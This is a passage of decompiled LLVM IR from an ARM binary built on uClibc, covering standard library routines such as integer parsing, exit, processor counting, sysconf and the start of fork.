  %v2_13994 = add i32 %v2_13990, %v4_1398c
  %v3_13994 = inttoptr i32 %v2_13994 to i16*
  %v4_13994 = load i16, i16* %v3_13994, align 2
  %v1_13998 = and i16 %v4_13994, 32
  %v2_13998 = icmp eq i16 %v1_13998, 0
  br i1 %v2_13998, label %dec_label_pc_139a0, label %dec_label_pc_13984

dec_label_pc_139a0:                               ; preds = %dec_label_pc_13988
  %v7_139a0 = icmp eq i8 %v2_13988, 43
  br i1 %v7_139a0, label %dec_label_pc_139c0, label %dec_label_pc_139a8

dec_label_pc_139a8:                               ; preds = %dec_label_pc_139a0
  %v7_139a8 = icmp eq i8 %v2_13988, 45
  br i1 %v7_139a8, label %dec_label_pc_139c0, label %bb

bb:                                               ; preds = %dec_label_pc_139a8
  store i32 0, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_139c4

dec_label_pc_139c0:                               ; preds = %dec_label_pc_139a0, %dec_label_pc_139a8
  %storemerge47 = phi i32 [ 1, %dec_label_pc_139a8 ], [ 0, %dec_label_pc_139a0 ]
  store i32 %storemerge47, i32* %r7.global-to-local, align 4
  %v1_139c0 = add i32 %v0_139c0, 1
  store i32 %v1_139c0, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_139c4

dec_label_pc_139c4:                               ; preds = %bb, %dec_label_pc_139c0
  %v0_139e4 = phi i32 [ %v0_139c0, %bb ], [ %v1_139c0, %dec_label_pc_139c0 ]
  %v1_139c4 = and i32 %v0_13974, -17
  %v3_139c4 = icmp eq i32 %v1_139c4, 0
  br i1 %v3_139c4, label %dec_label_pc_139d0, label %bb60

bb60:                                             ; preds = %dec_label_pc_139c4
  br label %bb64

dec_label_pc_139d0:                               ; preds = %dec_label_pc_139c4
  %v1_139d0 = inttoptr i32 %v0_139e4 to i8*
  %v2_139d0 = load i8, i8* %v1_139d0, align 1
  %v7_139d4 = icmp eq i8 %v2_139d0, 48
  %v1_139d8 = add i32 %v0_13974, 10
  store i32 %v1_139d8, i32* %r5.global-to-local, align 4
  br i1 %v7_139d4, label %dec_label_pc_139e4, label %bb61

bb61:                                             ; preds = %dec_label_pc_139d0
  br label %.thread8

dec_label_pc_139e4:                               ; preds = %dec_label_pc_139d0
  %v1_139e4 = add i32 %v0_139e4, 1
  %v2_139e4 = inttoptr i32 %v1_139e4 to i8*
  %v3_139e4 = load i8, i8* %v2_139e4, align 1
  %v4_139e4 = zext i8 %v3_139e4 to i32
  store i32 %v1_139e4, i32* %r4.global-to-local, align 4
  %v1_139e8 = or i32 %v4_139e4, 32
  %v7_139ec = icmp eq i32 %v1_139e8, 120
  %v1_139f0 = add i32 %v0_13974, 8
  store i32 %v1_139f0, i32* %r5.global-to-local, align 4
  br i1 %v7_139ec, label %bb62, label %.thread8

bb62:                                             ; preds = %dec_label_pc_139e4
  %v3_139fc = mul i32 %v1_139f0, 2
  store i32 %v3_139fc, i32* %r5.global-to-local, align 4
  %v2_13a00 = add i32 %v0_139e4, 2
  store i32 %v2_13a00, i32* %r4.global-to-local, align 4
  br label %.thread8

.thread8:                                         ; preds = %dec_label_pc_139e4, %bb61, %bb62
  %v1_13ad430 = phi i32 [ %v0_13978, %bb61 ], [ %v1_139e4, %bb62 ], [ %v1_139e4, %dec_label_pc_139e4 ]
  %v0_13a5021 = phi i32 [ %v0_139e4, %bb61 ], [ %v2_13a00, %bb62 ], [ %v1_139e4, %dec_label_pc_139e4 ]
  %v0_13a04 = phi i32 [ %v1_139d8, %bb61 ], [ %v3_139fc, %bb62 ], [ %v1_139f0, %dec_label_pc_139e4 ]
  %v5_13a08 = icmp slt i32 %v0_13a04, 16
  br i1 %v5_13a08, label %bb64, label %bb63

bb63:                                             ; preds = %.thread8
  store i32 16, i32* %r5.global-to-local, align 4
  br label %bb64

bb64:                                             ; preds = %bb60, %.thread8, %bb63
  %v1_13ad429 = phi i32 [ %v0_13978, %bb60 ], [ %v1_13ad430, %.thread8 ], [ %v1_13ad430, %bb63 ]
  %v0_13a5020 = phi i32 [ %v0_139e4, %bb60 ], [ %v0_13a5021, %.thread8 ], [ %v0_13a5021, %bb63 ]
  %v0_13a30 = phi i32 [ %v0_13974, %bb60 ], [ %v0_13a04, %.thread8 ], [ 16, %bb63 ]
  %v1_13a0c = add i32 %v0_13a30, -2
  %tmp = icmp ugt i32 %v1_13a0c, 34
  br i1 %tmp, label %.thread, label %dec_label_pc_13a1c

.thread:                                          ; preds = %bb64
  store i32 0, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_13ad0

dec_label_pc_13a1c:                               ; preds = %bb64
  %v2_13a24 = udiv i32 -1, %v0_13a30
  %v3_13a24 = urem i32 -1, %v0_13a30
  store i32 %v0_13a30, i32* %r1.global-to-local, align 4
  %v1_13a34 = urem i32 %v3_13a24, 256
  store i32 %v1_13a34, i32* %sl.global-to-local, align 4
  store i32 -1, i32* %fp.global-to-local, align 4
  store i32 %v2_13a24, i32* %r8.global-to-local, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_13a50

dec_label_pc_13a4c:                               ; preds = %bb71, %dec_label_pc_13aac
  %v0_13a4c = phi i32 [ %v1_13a8c44, %bb71 ], [ %v0_13a4c.pre, %dec_label_pc_13aac ]
  br label %dec_label_pc_13a50

dec_label_pc_13a50:                               ; preds = %dec_label_pc_13a1c, %dec_label_pc_13a4c
  %v1_13ad427 = phi i32 [ %v1_13ad429, %dec_label_pc_13a1c ], [ %v0_13a4c, %dec_label_pc_13a4c ]
  %v0_13a8c = phi i32 [ %v0_13a5020, %dec_label_pc_13a1c ], [ %v0_13a4c, %dec_label_pc_13a4c ]
  %v1_13a50 = inttoptr i32 %v0_13a8c to i8*
  %v2_13a50 = load i8, i8* %v1_13a50, align 1
  %v3_13a50 = zext i8 %v2_13a50 to i32
  %v1_13a54 = add nsw i32 %v3_13a50, -48
  %v1_13a58 = urem i32 %v1_13a54, 256
  store i32 %v1_13a58, i32* %r1.global-to-local, align 4
  %v1_13a60 = or i32 %v3_13a50, 32
  %tmp79 = icmp ult i32 %v1_13a58, 10
  br i1 %tmp79, label %bb66, label %dec_label_pc_13a68

dec_label_pc_13a68:                               ; preds = %dec_label_pc_13a50
  store i32 40, i32* %r1.global-to-local, align 4
  %tmp80 = icmp ugt i32 %v1_13a60, 96
  br i1 %tmp80, label %bb65, label %bb66

bb65:                                             ; preds = %dec_label_pc_13a68
  %v1_13a6c = add nsw i32 %v1_13a60, -87
  %v5_13a74 = urem i32 %v1_13a6c, 256
  store i32 %v5_13a74, i32* %r1.global-to-local, align 4
  br label %bb66

bb66:                                             ; preds = %dec_label_pc_13a50, %dec_label_pc_13a68, %bb65
  %v3_13aa4 = phi i32 [ %v1_13a58, %dec_label_pc_13a50 ], [ 40, %dec_label_pc_13a68 ], [ %v5_13a74, %bb65 ]
  %v1_13a78 = load i32, i32* %r5.global-to-local, align 4
  %v6_13a7c = icmp slt i32 %v3_13aa4, %v1_13a78
  br i1 %v6_13a7c, label %dec_label_pc_13a80, label %dec_label_pc_13ad0.loopexit

dec_label_pc_13a80:                               ; preds = %bb66
  %v0_13a80 = load i32, i32* %ip.global-to-local, align 4
  %v1_13a80 = load i32, i32* %r8.global-to-local, align 4
  %v9_13a80 = icmp eq i32 %v0_13a80, %v1_13a80
  br i1 %v9_13a80, label %.thread39, label %bb67

.thread39:                                        ; preds = %dec_label_pc_13a80
  %v1_13a8c40 = add i32 %v0_13a8c, 1
  store i32 %v1_13a8c40, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_13a94

bb67:                                             ; preds = %dec_label_pc_13a80
  %v3_13a80 = icmp ult i32 %v0_13a80, %v1_13a80
  %v1_13a8c = add i32 %v0_13a8c, 1
  store i32 %v1_13a8c, i32* %r4.global-to-local, align 4
  br i1 %v3_13a80, label %dec_label_pc_13a94, label %dec_label_pc_13aac

dec_label_pc_13a94:                               ; preds = %bb67, %.thread39
  %v1_13a8c44 = phi i32 [ %v1_13a8c40, %.thread39 ], [ %v1_13a8c, %bb67 ]
  %v4_13a9c2443 = phi i32 [ 1, %.thread39 ], [ 0, %bb67 ]
  %v1_13a94 = load i32, i32* %sl.global-to-local, align 4
  %v3_13a94 = icmp uge i32 %v3_13aa4, %v1_13a94
  %v9_13a94 = icmp eq i32 %v3_13aa4, %v1_13a94
  %v2_13a98 = xor i1 %v3_13a94, true
  %v3_13a98 = or i1 %v9_13a94, %v2_13a98
  br i1 %v3_13a98, label %bb68, label %bb69

bb68:                                             ; preds = %dec_label_pc_13a94
  br label %bb69

bb69:                                             ; preds = %dec_label_pc_13a94, %bb68
  %v4_13a9c = phi i32 [ %v4_13a9c2443, %dec_label_pc_13a94 ], [ 0, %bb68 ]
  %v2_13a9c = xor i1 %v9_13a94, true
  %v3_13a9c = and i1 %v3_13a94, %v2_13a9c
  br i1 %v3_13a9c, label %bb70, label %thread-pre-split

bb70:                                             ; preds = %bb69
  %v5_13a9c = urem i32 %v4_13a9c, 2
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %bb69, %bb70
  %v0_13aa0 = phi i32 [ %v5_13a9c, %bb70 ], [ %v4_13a9c, %bb69 ]
  %v2_13aa0 = icmp eq i32 %v0_13aa0, 0
  br i1 %v2_13aa0, label %bb71, label %dec_label_pc_13aac

bb71:                                             ; preds = %thread-pre-split
  %v4_13aa4 = mul i32 %v0_13a80, %v1_13a78
  %v5_13aa4 = add i32 %v4_13aa4, %v3_13aa4
  store i32 %v5_13aa4, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_13a4c

dec_label_pc_13aac:                               ; preds = %bb67, %thread-pre-split
  %v0_13ab4 = call i32 @__aeabi_read_tp()
  %v0_13ab8 = load i32, i32* %r7.global-to-local, align 4
  %v2_13ab8 = and i32 %v0_1397c, %v0_13ab8
  store i32 %v2_13ab8, i32* %r7.global-to-local, align 4
  %v0_13abc = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_13abc, i32* %ip.global-to-local, align 4
  %v3_13ac0 = load i16, i16* @global_var_2222c.358, align 2
  %v4_13ac0 = sext i16 %v3_13ac0 to i32
  %v3_13ac8 = add i32 %v4_13ac0, %v0_13ab4
  %v4_13ac8 = inttoptr i32 %v3_13ac8 to i32*
  store i32 34, i32* %v4_13ac8, align 4
  %v0_13a4c.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_13a4c

dec_label_pc_13ad0.loopexit:                      ; preds = %bb66
  %v0_13ad0.pre = load i32, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_13ad0

dec_label_pc_13ad0:                               ; preds = %.thread, %dec_label_pc_13ad0.loopexit
  %v1_13ad4 = phi i32 [ %v1_13ad427, %dec_label_pc_13ad0.loopexit ], [ %v1_13ad429, %.thread ]
  %v2_13ad4 = phi i32 [ %v0_13ad0.pre, %dec_label_pc_13ad0.loopexit ], [ %v0_13970, %.thread ]
  %v2_13ad0 = icmp eq i32 %v2_13ad4, 0
  br i1 %v2_13ad0, label %bb73, label %bb72

bb72:                                             ; preds = %dec_label_pc_13ad0
  %v3_13ad4 = inttoptr i32 %v2_13ad4 to i32*
  store i32 %v1_13ad4, i32* %v3_13ad4, align 4
  br label %bb73

bb73:                                             ; preds = %dec_label_pc_13ad0, %bb72
  %v0_13adc = load i32, i32* %r7.global-to-local, align 4
  %v2_13adc = icmp eq i32 %v0_13adc, 0
  %. = select i1 %v2_13adc, i32 2147483647, i32 -2147483648
  store i32 %., i32* %r1.global-to-local, align 4
  %v2_13ae8 = icmp eq i32 %v0_1397c, 0
  %v0_13b14.pre.pre = load i32, i32* %ip.global-to-local, align 4
  br i1 %v2_13ae8, label %dec_label_pc_13b0c, label %bb76

bb76:                                             ; preds = %bb73
  %tmp81 = icmp ugt i32 %v0_13b14.pre.pre, %.
  br i1 %tmp81, label %dec_label_pc_13af4, label %dec_label_pc_13b0c

dec_label_pc_13af4:                               ; preds = %bb76
  %v0_13af8 = call i32 @__aeabi_read_tp()
  %v3_13afc = load i16, i16* @global_var_2222c.358, align 2
  %v4_13afc = sext i16 %v3_13afc to i32
  %v3_13b04 = add i32 %v4_13afc, %v0_13af8
  %v4_13b04 = inttoptr i32 %v3_13b04 to i32*
  store i32 34, i32* %v4_13b04, align 4
  %v0_13b08 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_13b08, i32* %ip.global-to-local, align 4
  %v0_13b0c.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_13b0c

dec_label_pc_13b0c:                               ; preds = %bb76, %bb73, %dec_label_pc_13af4
  %v0_13b14.pre = phi i32 [ %v0_13b14.pre.pre, %bb76 ], [ %v0_13b08, %dec_label_pc_13af4 ], [ %v0_13b14.pre.pre, %bb73 ]
  %v0_13b0c = phi i32 [ %v0_13adc, %bb76 ], [ %v0_13b0c.pre, %dec_label_pc_13af4 ], [ %v0_13adc, %bb73 ]
  %v2_13b0c = icmp eq i32 %v0_13b0c, 0
  br i1 %v2_13b0c, label %dec_label_pc_13b0c._crit_edge, label %bb77

bb77:                                             ; preds = %dec_label_pc_13b0c
  %v2_13b10 = sub i32 0, %v0_13b14.pre
  store i32 %v2_13b10, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_13b0c._crit_edge

dec_label_pc_13b0c._crit_edge:                    ; preds = %dec_label_pc_13b0c, %bb77
  %v0_13b14 = phi i32 [ %v2_13b10, %bb77 ], [ %v0_13b14.pre, %dec_label_pc_13b0c ]
  ret i32 %v0_13b14

; uselistorder directives
  uselistorder i32 %v0_13b14.pre, { 1, 0 }
  uselistorder i32 %v0_13b14.pre.pre, { 1, 2, 0 }
  uselistorder i32 %v4_13a9c, { 1, 0 }
  uselistorder i1 %v3_13a94, { 1, 0 }
  uselistorder i32 %v1_13a94, { 1, 0 }
  uselistorder i32 %v5_13a74, { 1, 0 }
  uselistorder i32 %v1_13a60, { 1, 0 }
  uselistorder i32 %v1_13a58, { 2, 0, 1 }
  uselistorder i32 %v0_13a8c, { 1, 0, 2 }
  uselistorder i32 %v0_13a4c, { 1, 0 }
  uselistorder i32 %v3_139fc, { 1, 0 }
  uselistorder i32 %v1_139f0, { 1, 0, 2 }
  uselistorder i32 %v0_139e4, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v0_139c0, { 0, 1, 3, 2 }
  uselistorder i32 %v0_1397c, { 1, 0 }
  uselistorder i32 %v0_13978, { 1, 0, 2, 3 }
  uselistorder i32 %v0_13974, { 1, 0, 2, 3, 4 }
  uselistorder i32* %r7.global-to-local, { 2, 3, 1, 4, 0, 5 }
  uselistorder i32* %r5.global-to-local, { 4, 0, 1, 2, 3, 5 }
  uselistorder i32* %r4.global-to-local, { 6, 0, 7, 1, 2, 3, 4, 5 }
  uselistorder i32* %r1.global-to-local, { 5, 6, 0, 1, 2, 3, 4 }
  uselistorder i32* %ip.global-to-local, { 0, 1, 6, 2, 3, 4, 5, 7, 8 }
  uselistorder i32 34, { 1, 2, 0, 4, 6, 3, 7, 5 }
  uselistorder i8 48, { 1, 0, 2 }
  uselistorder i32 -17, { 1, 0 }
  uselistorder i8 45, { 0, 2, 1 }
  uselistorder label %dec_label_pc_13b0c._crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_13b0c, { 2, 0, 1 }
  uselistorder label %bb73, { 1, 0 }
  uselistorder label %dec_label_pc_13ad0, { 1, 0 }
  uselistorder label %dec_label_pc_13aac, { 1, 0 }
  uselistorder label %thread-pre-split, { 1, 0 }
  uselistorder label %bb69, { 1, 0 }
  uselistorder label %bb66, { 2, 1, 0 }
  uselistorder label %dec_label_pc_13a50, { 1, 0 }
  uselistorder label %dec_label_pc_13a4c, { 1, 0 }
  uselistorder label %bb64, { 2, 1, 0 }
  uselistorder label %.thread8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_139c4, { 1, 0 }
  uselistorder label %dec_label_pc_139c0, { 1, 0 }
  uselistorder label %dec_label_pc_13988, { 1, 0 }
}

define i32 @__GI_exit(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_221d4.362 to i32), i32* @r5, align 4
  %v4_13b40 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_221d4.362 to i32), i32 140) to i32*), align 4
  store i32 %v4_13b40, i32* @r4, align 4
  %v2_13b48 = ptrtoint i32* %stack_var_-16 to i32
  store i32 %arg1, i32* @r6, align 4
  %v4_13b60 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_221d4.362 to i32), i32 112) to i32*), align 4
  call void @__pseudo_branch(i32 %v4_13b60)
  %v0_13b74 = load i32, i32* @r5, align 4
  %v2_13b74 = add i32 %v0_13b74, 16
  %v3_13b74 = inttoptr i32 %v2_13b74 to i32*
  %v4_13b74 = load i32, i32* %v3_13b74, align 4
  call void @__pseudo_branch(i32 %v4_13b74)
  %v0_13b84 = load i32, i32* @r5, align 4
  %v2_13b84 = add i32 %v0_13b84, 636
  %v3_13b84 = inttoptr i32 %v2_13b84 to i32*
  %v4_13b84 = load i32, i32* %v3_13b84, align 4
  %v2_13b8c = icmp eq i32 %v4_13b84, 0
  br i1 %v2_13b8c, label %.thread, label %bb

bb:                                               ; preds = %entry
  br label %.thread

.thread:                                          ; preds = %entry, %bb
  %v2_13b98 = xor i1 %v2_13b8c, true
  call void @__pseudo_cond_branch(i1 %v2_13b98, i32 %v4_13b84)
  store i32 %v2_13b48, i32* @r0, align 4
  %v0_13ba8 = load i32, i32* @r5, align 4
  %v2_13ba8 = add i32 %v0_13ba8, 44
  %v3_13ba8 = inttoptr i32 %v2_13ba8 to i32*
  %v4_13ba8 = load i32, i32* %v3_13ba8, align 4
  call void @__pseudo_branch(i32 %v4_13ba8)
  %v0_13bb4 = call i32 @__GI___uClibc_fini()
  %v0_13bbc = load i32, i32* @r5, align 4
  %v2_13bbc = add i32 %v0_13bbc, -47776
  %v2_13bc4 = icmp eq i32 %v2_13bbc, 0
  br i1 %v2_13bc4, label %bb9, label %bb8

bb8:                                              ; preds = %.thread
  br label %bb9

bb9:                                              ; preds = %.thread, %bb8
  %v2_13bcc = xor i1 %v2_13bc4, true
  call void @__pseudo_cond_branch(i1 %v2_13bcc, i32 %v2_13bbc)
  %v0_13bd0 = load i32, i32* @r6, align 4
  %v1_13bd4 = call i32 @__GI__exit(i32 %v0_13bd0)
  %v0_13bd8 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_13bd8, label %bb10, label %.thread6

bb10:                                             ; preds = %bb9
  br label %.thread6

.thread6:                                         ; preds = %bb9, %bb10
  %v4_13bf0 = phi i32 [ %v1_13bd4, %bb9 ], [ 0, %bb10 ]
  ret i32 %v4_13bf0

; uselistorder directives
  uselistorder label %.thread6, { 1, 0 }
  uselistorder label %bb9, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @nprocessors_onln() local_unnamed_addr {
entry:
  %stack_var_-36 = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_221d4.362 to i32), i32* @r4, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_221d4.362 to i32), i32 -34012), i32* @r0, align 4
  store i32 0, i32* @r5, align 4
  store i32 0, i32* %stack_var_-36, align 4
  %v1_13c18 = call i32 @__GI_config_open(i32 add (i32 ptrtoint (i32* @global_var_221d4.362 to i32), i32 -34012))
  store i32 %v1_13c18, i32* @r6, align 4
  %v2_13c1c = icmp eq i32 %v1_13c18, 0
  br i1 %v2_13c1c, label %dec_label_pc_13c9c, label %dec_label_pc_13c24

dec_label_pc_13c24:                               ; preds = %entry
  store i32 276, i32* @sl, align 4
  %v0_13c2c = load i32, i32* @r4, align 4
  %v2_13c2c = add i32 %v0_13c2c, -34000
  store i32 %v2_13c2c, i32* @r8, align 4
  %v2_13c30 = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_13c30, i32* @r7, align 4
  br label %bb18

dec_label_pc_13c38:                               ; preds = %bb18
  %v3_13c38 = load i32, i32* %stack_var_-36, align 4
  %v1_13c3c = inttoptr i32 %v3_13c38 to i32*
  %v2_13c3c = load i32, i32* %v1_13c3c, align 4
  %v1_13c40 = inttoptr i32 %v2_13c3c to i8*
  %v2_13c40 = load i8, i8* %v1_13c40, align 1
  %v7_13c44 = icmp eq i8 %v2_13c40, 99
  br i1 %v7_13c44, label %dec_label_pc_13c4c, label %.backedge3

dec_label_pc_13c4c:                               ; preds = %dec_label_pc_13c38
  %v1_13c4c = add i32 %v2_13c3c, 1
  %v2_13c4c = inttoptr i32 %v1_13c4c to i8*
  %v3_13c4c = load i8, i8* %v2_13c4c, align 1
  %v7_13c50 = icmp eq i8 %v3_13c4c, 112
  br i1 %v7_13c50, label %dec_label_pc_13c58, label %.backedge3

dec_label_pc_13c58:                               ; preds = %dec_label_pc_13c4c
  %v1_13c58 = add i32 %v2_13c3c, 2
  %v2_13c58 = inttoptr i32 %v1_13c58 to i8*
  %v3_13c58 = load i8, i8* %v2_13c58, align 1
  %v7_13c5c = icmp eq i8 %v3_13c58, 117
  br i1 %v7_13c5c, label %dec_label_pc_13c64, label %.backedge3

dec_label_pc_13c64:                               ; preds = %dec_label_pc_13c58
  %v1_13c64 = add i32 %v2_13c3c, 3
  %v2_13c64 = inttoptr i32 %v1_13c64 to i8*
  %v3_13c64 = load i8, i8* %v2_13c64, align 1
  %v4_13c64 = zext i8 %v3_13c64 to i32
  %v0_13c68 = load i32, i32* @r4, align 4
  %v1_13c68 = load i32, i32* @sl, align 4
  %v2_13c68 = add i32 %v1_13c68, %v0_13c68
  %v3_13c68 = inttoptr i32 %v2_13c68 to i32*
  %v4_13c68 = load i32, i32* %v3_13c68, align 4
  %v2_13c6c = mul nuw nsw i32 %v4_13c64, 2
  %v2_13c70 = add i32 %v4_13c68, %v2_13c6c
  %v3_13c70 = inttoptr i32 %v2_13c70 to i16*
  %v4_13c70 = load i16, i16* %v3_13c70, align 2
  %v1_13c74 = and i16 %v4_13c70, 8
  %v2_13c74 = icmp eq i16 %v1_13c74, 0
  br i1 %v2_13c74, label %.backedge3, label %bb

bb:                                               ; preds = %dec_label_pc_13c64
  %v1_13c78 = load i32, i32* @r5, align 4
  %v2_13c78 = add i32 %v1_13c78, 1
  store i32 %v2_13c78, i32* @r5, align 4
  br label %.backedge3

.backedge3:                                       ; preds = %bb, %dec_label_pc_13c64, %dec_label_pc_13c38, %dec_label_pc_13c4c, %dec_label_pc_13c58
  %v0_13c7c.pre = load i32, i32* @r6, align 4
  %v0_13c88.pre = load i32, i32* @r8, align 4
  br label %bb18

bb18:                                             ; preds = %.backedge3, %dec_label_pc_13c24
  %v0_13c88 = phi i32 [ %v0_13c88.pre, %.backedge3 ], [ %v2_13c2c, %dec_label_pc_13c24 ]
  %v0_13c7c = phi i32 [ %v0_13c7c.pre, %.backedge3 ], [ %v1_13c18, %dec_label_pc_13c24 ]
  %v4_13c8c = inttoptr i32 %v0_13c7c to i32*
  %v5_13c8c = call i32 @__GI_config_read(i32* %v4_13c8c, i32 %v2_13c30, i32 258, i32 %v0_13c88)
  %v2_13c90 = icmp eq i32 %v5_13c8c, 0
  br i1 %v2_13c90, label %dec_label_pc_13d00, label %dec_label_pc_13c38

dec_label_pc_13c9c:                               ; preds = %entry
  %v0_13ca0 = load i32, i32* @r4, align 4
  %v2_13ca0 = add i32 %v0_13ca0, -33996
  store i32 %v2_13ca0, i32* @r0, align 4
  %v1_13ca4 = call i32 @__GI_config_open(i32 %v2_13ca0)
  store i32 %v1_13ca4, i32* @r6, align 4
  %v2_13ca8 = icmp eq i32 %v1_13ca4, 0
  br i1 %v2_13ca8, label %bb19, label %dec_label_pc_13cb4

bb19:                                             ; preds = %dec_label_pc_13c9c
  store i32 0, i32* @r5, align 4
  br label %dec_label_pc_13d00

dec_label_pc_13cb4:                               ; preds = %dec_label_pc_13c9c
  %v0_13cb8 = load i32, i32* @r4, align 4
  %v2_13cb8 = add i32 %v0_13cb8, -33980
  store i32 %v2_13cb8, i32* @r8, align 4
  %v2_13cc0 = add i32 %v0_13cb8, -33944
  store i32 %v2_13cc0, i32* @r7, align 4
  %v2_13cc4 = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_13cc4, i32* @r4, align 4
  br label %bb21

dec_label_pc_13ccc:                               ; preds = %bb21
  %v0_13cf8 = load i32, i32* @r8, align 4
  %v3_13ccc = load i32, i32* %stack_var_-36, align 4
  %v1_13cd0 = inttoptr i32 %v3_13ccc to i32*
  %v2_13cd0 = load i32, i32* %v1_13cd0, align 4
  store i32 %v2_13cd0, i32* @r1, align 4
  %v2_13cd4 = inttoptr i32 %v0_13cf8 to i8*
  %v3_13cd4 = call i32 @__GI_strcoll(i8* %v2_13cd4, i32 %v2_13cd0)
  %v2_13cd8 = icmp eq i32 %v3_13cd4, 0
  br i1 %v2_13cd8, label %bb20, label %.backedge

bb20:                                             ; preds = %dec_label_pc_13ccc
  %v1_13cdc = load i32, i32* @r5, align 4
  %v2_13cdc = add i32 %v1_13cdc, 1
  store i32 %v2_13cdc, i32* @r5, align 4
  br label %.backedge

.backedge:                                        ; preds = %bb20, %dec_label_pc_13ccc
  %v0_13ce8.pre = load i32, i32* @r7, align 4
  %v0_13cec.pre = load i32, i32* @r6, align 4
  br label %bb21

bb21:                                             ; preds = %.backedge, %dec_label_pc_13cb4
  %v0_13cec = phi i32 [ %v0_13cec.pre, %.backedge ], [ %v1_13ca4, %dec_label_pc_13cb4 ]
  %v0_13ce8 = phi i32 [ %v0_13ce8.pre, %.backedge ], [ %v2_13cc0, %dec_label_pc_13cb4 ]
  %v4_13cf0 = inttoptr i32 %v0_13cec to i32*
  %v5_13cf0 = call i32 @__GI_config_read(i32* %v4_13cf0, i32 %v2_13cc4, i32 459266, i32 %v0_13ce8)
  %v2_13cf4 = icmp eq i32 %v5_13cf0, 0
  br i1 %v2_13cf4, label %dec_label_pc_13d00, label %dec_label_pc_13ccc

dec_label_pc_13d00:                               ; preds = %bb18, %bb21, %bb19
  %v0_13d00 = load i32, i32* @r6, align 4
  %v1_13d04 = inttoptr i32 %v0_13d00 to i32*
  %v2_13d04 = call i32 @__GI_config_close(i32* %v1_13d04)
  %v0_13d08 = load i32, i32* @r5, align 4
  %v2_13d08 = icmp eq i32 %v0_13d08, 0
  %.v0_13d08 = select i1 %v2_13d08, i32 1, i32 %v0_13d08
  ret i32 %.v0_13d08

; uselistorder directives
  uselistorder i32* %stack_var_-36, { 0, 3, 1, 4, 2 }
  uselistorder i32 (i32)* @__GI_config_open, { 1, 0 }
  uselistorder label %dec_label_pc_13d00, { 1, 2, 0 }
  uselistorder label %.backedge3, { 0, 1, 4, 3, 2 }
}

define i32 @sysconf(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %tmp = icmp ult i32 %arg1, 241
  br i1 %tmp, label %bb, label %dec_label_pc_14134

bb:                                               ; preds = %entry
  %v7_13d58 = mul i32 %arg1, 4
  %v8_13d58 = add i32 %v7_13d58, ptrtoint (i32* @global_var_13d60.504 to i32)
  call void @__pseudo_branch(i32 %v8_13d58)
  br label %dec_label_pc_14134

dec_label_pc_14134:                               ; preds = %bb, %entry
  %v0_14138 = call i32 @__aeabi_read_tp()
  %v3_1413c = load i16, i16* @global_var_2222c.358, align 2
  %v4_1413c = sext i16 %v3_1413c to i32
  store i32 -1, i32* %r1.global-to-local, align 4
  %v3_14148 = add i32 %v4_1413c, %v0_14138
  %v4_14148 = inttoptr i32 %v3_14148 to i32*
  store i32 22, i32* %v4_14148, align 4
  %v0_1432c = load i32, i32* %r1.global-to-local, align 4
  ret i32 %v0_1432c

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @__libc_fork() local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %stack_var_-88 = alloca i32, align 4
  store i32 12820, i32* %r5.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_221d4.362 to i32), i32* %r8.global-to-local, align 4
  %v4_1445816 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_221d4.362 to i32), i32 12820) to i32*), align 4
  store i32 %v4_1445816, i32* %r7.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1445c18 = icmp eq i32 %v4_1445816, 0
  br i1 %v2_1445c18, label %dec_label_pc_14464, label %dec_label_pc_14388

dec_label_pc_14388:                               ; preds = %entry, %dec_label_pc_14458.backedge
  call void @__pseudo_branch(i32 -61536)
  %v0_14394 = load i32, i32* %r7.global-to-local, align 4
  %v1_14394 = add i32 %v0_14394, 20
  %v2_14394 = inttoptr i32 %v1_14394 to i32*
  %v3_14394 = load i32, i32* %v2_14394, align 4
  store i32 %v3_14394, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_14398 = icmp eq i32 %v3_14394, 0
  store i32 %v3_14394, i32* %r4.global-to-local, align 4
  br i1 %v2_14398, label %dec_label_pc_14458.backedge, label %dec_label_pc_143a8

dec_label_pc_14458.backedge:                      ; preds = %dec_label_pc_14388, %dec_label_pc_143d4
  %v0_14458 = load i32, i32* %r8.global-to-local, align 4
  %v1_14458 = load i32, i32* %r5.global-to-local, align 4
  %v2_14458 = add i32 %v1_14458, %v0_14458
